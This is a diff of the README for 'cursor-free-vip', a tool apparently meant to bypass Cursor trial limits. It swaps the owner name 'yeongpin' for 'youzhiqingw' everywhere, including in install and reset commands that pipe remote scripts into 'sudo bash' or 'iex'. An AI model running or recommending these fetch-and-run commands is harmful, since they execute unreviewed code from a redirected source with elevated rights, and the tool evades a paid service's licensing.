@@ -7,18 +7,18 @@
 
 <p align="center">
 
-[![Release](https://img.shields.io/endpoint?url=https://www.pinnumber.rr.nu/badges/release/yeongpin/cursor-free-vip)](https://github.com/yeongpin/cursor-free-vip/releases/latest)
+[![Release](https://img.shields.io/endpoint?url=https://www.pinnumber.rr.nu/badges/release/youzhiqingw/cursor-free-vip)](https://github.com/youzhiqingw/cursor-free-vip/releases/latest)
 [![License: CC BY-NC-ND 4.0](https://img.shields.io/badge/License-CC_BY--NC--ND_4.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-nd/4.0/)
-[![Stars](https://img.shields.io/endpoint?url=https://www.pinnumber.rr.nu/badges/stars/yeongpin/cursor-free-vip)](https://github.com/yeongpin/cursor-free-vip/stargazers)
-[![Downloads](https://img.shields.io/endpoint?url=https://www.pinnumber.rr.nu/badges/downloads/yeongpin/cursor-free-vip/total)](https://github.com/yeongpin/cursor-free-vip/releases/latest)
-<a href="https://buymeacoffee.com/yeongpin" target="_blank"><img alt="Buy Me a Coffee" src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support%20Me-FFDA33"></a>
+[![Stars](https://img.shields.io/endpoint?url=https://www.pinnumber.rr.nu/badges/stars/youzhiqingw/cursor-free-vip)](https://github.com/youzhiqingw/cursor-free-vip/stargazers)
+[![Downloads](https://img.shields.io/endpoint?url=https://www.pinnumber.rr.nu/badges/downloads/youzhiqingw/cursor-free-vip/total)](https://github.com/youzhiqingw/cursor-free-vip/releases/latest)
+<a href="https://buymeacoffee.com/youzhiqingw" target="_blank"><img alt="Buy Me a Coffee" src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support%20Me-FFDA33"></a>
 
 </p>
 
-<a href="https://trendshift.io/repositories/13425" target="_blank"><img src="https://trendshift.io/api/badge/repositories/13425" alt="yeongpin%2Fcursor-free-vip | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+<a href="https://trendshift.io/repositories/13425" target="_blank"><img src="https://trendshift.io/api/badge/repositories/13425" alt="youzhiqingw%2Fcursor-free-vip | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
 <br>
-<a href="https://www.buymeacoffee.com/yeongpin" target="_blank">
-      <img src="https://img.buymeacoffee.com/button-api/?text=buy me a coffee&emoji=☕&slug=yeongpin&button_colour=ffda33&font_colour=000000&font_family=Bree&outline_colour=000000&coffee_colour=FFDD00&latest=2" width="160" height='55' alt="Buy Me a Coffee"/>
+<a href="https://www.buymeacoffee.com/youzhiqingw" target="_blank">
+      <img src="https://img.buymeacoffee.com/button-api/?text=buy me a coffee&emoji=☕&slug=youzhiqingw&button_colour=ffda33&font_colour=000000&font_family=Bree&outline_colour=000000&coffee_colour=FFDD00&latest=2" width="160" height='55' alt="Buy Me a Coffee"/>
 </a>
 
 
@@ -85,7 +85,7 @@ Always clean your browser's cache and cookies. If possible, use a VPN to create 
 ### **Linux/macOS**
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.sh -o install.sh && chmod +x install.sh && ./install.sh
+curl -fsSL https://raw.githubusercontent.com/youzhiqingw/cursor-free-vip/main/scripts/install.sh -o install.sh && chmod +x install.sh && ./install.sh
 ```
 
 ### **Archlinux**
@@ -99,7 +99,7 @@ yay -S cursor-free-vip-git
 ### **Windows**
 
 ```powershell
-irm https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.ps1 | iex
+irm https://raw.githubusercontent.com/youzhiqingw/cursor-free-vip/main/scripts/install.ps1 | iex
 ```
 
 </details>
@@ -110,13 +110,13 @@ irm https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/inst
 ### **Linux/macOS**
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/reset.sh | sudo bash
+curl -fsSL https://raw.githubusercontent.com/youzhiqingw/cursor-free-vip/main/scripts/reset.sh | sudo bash
 ```
 
 ### **Windows**
 
 ```powershell
-irm https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/reset.ps1 | iex
+irm https://raw.githubusercontent.com/youzhiqingw/cursor-free-vip/main/scripts/reset.ps1 | iex
 ```
 
 </details>
@@ -187,13 +187,13 @@ check_update = True
 show_account_info = True
 
 [WindowsPaths]
-storage_path = C:\Users\yeongpin\AppData\Roaming\Cursor\User\globalStorage\storage.json
-sqlite_path = C:\Users\yeongpin\AppData\Roaming\Cursor\User\globalStorage\state.vscdb
-machine_id_path = C:\Users\yeongpin\AppData\Roaming\Cursor\machineId
-cursor_path = C:\Users\yeongpin\AppData\Local\Programs\Cursor\resources\app
-updater_path = C:\Users\yeongpin\AppData\Local\cursor-updater
-update_yml_path = C:\Users\yeongpin\AppData\Local\Programs\Cursor\resources\app-update.yml
-product_json_path = C:\Users\yeongpin\AppData\Local\Programs\Cursor\resources\app\product.json
+storage_path = C:\Users\youzhiqingw\AppData\Roaming\Cursor\User\globalStorage\storage.json
+sqlite_path = C:\Users\youzhiqingw\AppData\Roaming\Cursor\User\globalStorage\state.vscdb
+machine_id_path = C:\Users\youzhiqingw\AppData\Roaming\Cursor\machineId
+cursor_path = C:\Users\youzhiqingw\AppData\Local\Programs\Cursor\resources\app
+updater_path = C:\Users\youzhiqingw\AppData\Local\cursor-updater
+update_yml_path = C:\Users\youzhiqingw\AppData\Local\Programs\Cursor\resources\app-update.yml
+product_json_path = C:\Users\youzhiqingw\AppData\Local\Programs\Cursor\resources\app\product.json
 
 [Browser]
 default_browser = opera
@@ -205,7 +205,7 @@ chrome_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\chromedriver.exe
 edge_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\msedgedriver.exe
 firefox_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\geckodriver.exe
 brave_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\chromedriver.exe
-opera_path = C:\Users\yeongpin\AppData\Local\Programs\Opera\opera.exe
+opera_path = C:\Users\youzhiqingw\AppData\Local\Programs\Opera\opera.exe
 opera_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\chromedriver.exe
 
 [OAuth]
@@ -235,8 +235,8 @@ max_attempts = 3
 歡迎提交 Issue 和 Pull Request！
 
 
-<a href="https://github.com/yeongpin/cursor-free-vip/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=yeongpin/cursor-free-vip&preview=true&max=&columns=" />
+<a href="https://github.com/youzhiqingw/cursor-free-vip/graphs/contributors">
+  <img src="https://contrib.rocks/image?repo=youzhiqingw/cursor-free-vip&preview=true&max=&columns=" />
 </a>
 <br /><br />
 
@@ -266,7 +266,7 @@ by the user.
 
 <div align="center">
 
-[![Star History Chart](https://api.star-history.com/svg?repos=yeongpin/cursor-free-vip&type=Date)](https://star-history.com/#yeongpin/cursor-free-vip&Date)
+[![Star History Chart](https://api.star-history.com/svg?repos=youzhiqingw/cursor-free-vip&type=Date)](https://star-history.com/#youzhiqingw/cursor-free-vip&Date)
 
 </div>
 
